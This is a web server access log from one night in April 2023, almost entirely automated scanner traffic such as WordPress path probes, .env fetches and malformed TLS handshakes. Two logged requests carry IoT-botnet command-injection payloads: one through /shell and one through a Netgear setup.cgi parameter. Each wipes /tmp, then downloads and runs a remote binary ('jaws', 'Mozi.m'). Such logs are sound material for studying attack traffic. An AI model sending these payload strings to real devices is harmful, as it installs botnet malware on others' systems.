172.71.135.25 - - [22/Apr/2023:00:43:14 +0200] "GET /cart HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
128.1.248.26 - - [22/Apr/2023:00:46:37 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
37.221.92.199 - - [22/Apr/2023:01:02:38 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
193.32.162.159 - - [22/Apr/2023:01:10:22 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:01:10:32 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.102.61.10 - - [22/Apr/2023:01:11:17 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
94.102.61.10 - - [22/Apr/2023:01:11:39 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
15.235.50.228 - - [22/Apr/2023:01:29:19 +0200] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BuiltWith/1.0; +http://builtwith.com/biup) Chrome/60.0.3112.101 Safari/537.36"
15.235.50.228 - - [22/Apr/2023:01:29:20 +0200] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BuiltWith/1.0; +http://builtwith.com/biup) Chrome/60.0.3112.101 Safari/537.36"
109.237.97.180 - - [22/Apr/2023:01:31:07 +0200] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [22/Apr/2023:01:31:08 +0200] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\xDAt\x14\xC7\x08\xA7\x1B\x9C\xBB2\xB0\xEF)\xEF\xD4\x12\xF9\xEE_\xBD\xB6#p\x1A\xE3V\xFD\x15\xDFfet \x1B\xF9\xE1S\xC6\xC7\xD8\x07\xC5\x87#Q\x86\xC5\x8BN\x14|\x0F\xDA\xF6(\xFDK\x8B\xBD>\xAC\x1A)\x9D\xBD\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 166 "-" "-"
205.210.31.39 - - [22/Apr/2023:01:35:34 +0200] "GET / HTTP/1.0" 200 612 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
183.136.225.32 - - [22/Apr/2023:01:38:44 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
205.210.31.50 - - [22/Apr/2023:01:41:59 +0200] "GET / HTTP/1.1" 301 178 "-" "-"
198.235.24.162 - - [22/Apr/2023:01:46:03 +0200] "GET / HTTP/1.1" 200 612 "-" "-"
183.136.225.32 - - [22/Apr/2023:01:46:35 +0200] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
14.116.157.23 - - [22/Apr/2023:01:48:02 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
92.118.39.82 - - [22/Apr/2023:01:57:18 +0200] "GET / HTTP/1.1" 200 612 "-" "-"
92.118.39.82 - - [22/Apr/2023:01:57:19 +0200] "GET /cgi-bin/downloadFlile.cgi HTTP/1.1" 404 162 "-" "Hello World"
92.118.39.82 - - [22/Apr/2023:02:00:50 +0200] "GET / HTTP/1.1" 200 612 "-" "-"
92.118.39.82 - - [22/Apr/2023:02:00:51 +0200] "GET /cgi-bin/downloadFlile.cgi HTTP/1.1" 404 162 "-" "Hello World"
159.223.93.123 - - [22/Apr/2023:02:05:15 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:15 +0200] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:16 +0200] "GET /xmlrpc.php?rsd HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:17 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:18 +0200] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:19 +0200] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:19 +0200] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:20 +0200] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:21 +0200] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:22 +0200] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:22 +0200] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:23 +0200] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:23 +0200] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:24 +0200] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:25 +0200] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:25 +0200] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:26 +0200] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:27 +0200] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:27 +0200] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:28 +0200] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
159.223.93.123 - - [22/Apr/2023:02:05:29 +0200] "" 400 0 "-" "-"
193.32.162.159 - - [22/Apr/2023:02:17:33 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:02:17:43 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
165.22.112.240 - - [22/Apr/2023:02:17:55 +0200] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCEo\xDB\xA4\xD4\x1A:\xB2\xBB\xE0T\xD8\xA2\xEB\xF1\xF4\x028E\xD7\xB1\x14\xF6\xC9\x96K\x1F\xC9\x91\xDA\x9A\x8A\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
165.22.112.240 - - [22/Apr/2023:02:17:55 +0200] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEA\xA0\x92\x1A\xC2A\xAB\xD2\xA2\xEEWf\x19w\xD3\xE5\xA2\x1E\xE8\x91\xBFeC\xF8\xCBF\x02\x1E8+\x14\xF3\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
165.22.112.240 - - [22/Apr/2023:02:17:55 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.22.112.240 - - [22/Apr/2023:02:17:55 +0200] "GET /client/get_targets HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.22.112.240 - - [22/Apr/2023:02:17:56 +0200] "GET /upl.php HTTP/1.1" 404 134 "-" "Mozilla/5.0"
165.22.112.240 - - [22/Apr/2023:02:17:56 +0200] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x0F\x07q\xFE\xD6\x16<\x5CE,~\x96&\xB2$\xD2\x05\xF9\xD6^\x17g\xB4b3\x1C\x90\xF4\xB1\x82^\xCB\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
165.22.112.240 - - [22/Apr/2023:02:17:56 +0200] "GET /geoip/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.22.112.240 - - [22/Apr/2023:02:17:56 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
165.22.112.240 - - [22/Apr/2023:02:17:56 +0200] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
115.85.30.27 - - [22/Apr/2023:02:20:54 +0200] "GET / HTTP/1.0" 200 612 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
162.158.189.53 - - [22/Apr/2023:02:28:31 +0200] "GET /wp-login.php HTTP/1.1" 404 134 "-" "Mozilla/5.0"
193.32.162.159 - - [22/Apr/2023:02:43:46 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:02:43:56 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
90.182.0.218 - - [22/Apr/2023:03:04:33 +0200] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" 404 162 "-" "Hello, world"
64.226.69.47 - - [22/Apr/2023:03:10:34 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
198.235.24.58 - - [22/Apr/2023:03:35:42 +0200] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x7FNb\x0F+\x04\x1EK\xFA\x0B\xCA\xE4\xFB\xE9\xAD\x96\xD6\xB4\x1C\xF0\xFC\x22\x08\x86\xFAkt\xA9\xA9\x05T\x5C\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"
209.38.252.58 - - [22/Apr/2023:03:40:39 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0.5) Gecko/20100101 Firefox/66.0.5"
51.159.164.227 - - [22/Apr/2023:03:55:14 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
51.159.164.227 - - [22/Apr/2023:03:55:14 +0200] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
37.221.92.199 - - [22/Apr/2023:03:59:25 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
205.210.31.165 - - [22/Apr/2023:04:03:48 +0200] "GET / HTTP/1.1" 301 178 "-" "-"
193.32.162.159 - - [22/Apr/2023:04:13:31 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:04:13:41 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:04:15:06 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:04:15:16 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
2.147.129.3 - - [22/Apr/2023:04:24:11 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
162.19.180.190 - - [22/Apr/2023:04:37:23 +0200] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
162.19.180.190 - - [22/Apr/2023:04:37:24 +0200] "GET /wp-content/ HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
172.71.135.48 - - [22/Apr/2023:04:41:05 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:05 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:05 +0200] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:05 +0200] "GET /xmlrpc.php?rsd HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:05 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:06 +0200] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:06 +0200] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:06 +0200] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:06 +0200] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:06 +0200] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:07 +0200] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:07 +0200] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:07 +0200] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:07 +0200] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:07 +0200] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:07 +0200] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:07 +0200] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:08 +0200] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:08 +0200] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.71.135.48 - - [22/Apr/2023:04:41:08 +0200] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
198.235.24.15 - - [22/Apr/2023:04:43:07 +0200] "GET / HTTP/1.1" 301 178 "-" "-"
128.14.134.170 - - [22/Apr/2023:05:00:20 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
89.187.163.213 - - [22/Apr/2023:05:06:36 +0200] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
89.187.163.213 - - [22/Apr/2023:05:06:36 +0200] "" 400 0 "-" "-"
172.71.211.35 - - [22/Apr/2023:05:38:16 +0200] "GET /wp-login.php HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
23.251.102.74 - - [22/Apr/2023:05:40:29 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
119.122.90.48 - - [22/Apr/2023:05:44:51 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
119.122.90.48 - - [22/Apr/2023:05:44:51 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
103.92.27.198 - - [22/Apr/2023:05:46:38 +0200] "GET /wp-login.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
193.32.162.159 - - [22/Apr/2023:05:47:43 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:05:47:53 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
223.149.254.218 - - [22/Apr/2023:05:54:47 +0200] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
147.75.50.227 - - [22/Apr/2023:06:07:45 +0200] "GET /.well-known/acme-challenge/derp HTTP/1.1" 301 178 "-" "Faraday v1.10.0"
